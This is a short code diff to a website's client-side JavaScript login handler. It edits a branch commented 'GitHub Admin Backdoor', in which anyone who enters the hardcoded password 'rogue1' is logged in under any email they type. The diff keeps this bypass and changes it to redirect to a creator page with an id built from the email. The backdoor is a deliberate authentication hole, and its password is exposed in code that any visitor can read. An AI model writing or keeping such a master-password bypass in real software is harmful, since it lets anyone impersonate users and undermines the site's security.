@@ -324,8 +324,9 @@
         if (mode === "login") {
           // GitHub Admin Backdoor
           if (password === "rogue1") {
-            localStorage.setItem("gh_user", email.toLowerCase().trim());
-            window.location.href = "members.html";
+            const u = email.toLowerCase().trim();
+            localStorage.setItem("gh_user", u);
+            window.location.href = "creator.html?id=github_" + u.replace(/\s+/g, "_");
             return;
           }
           
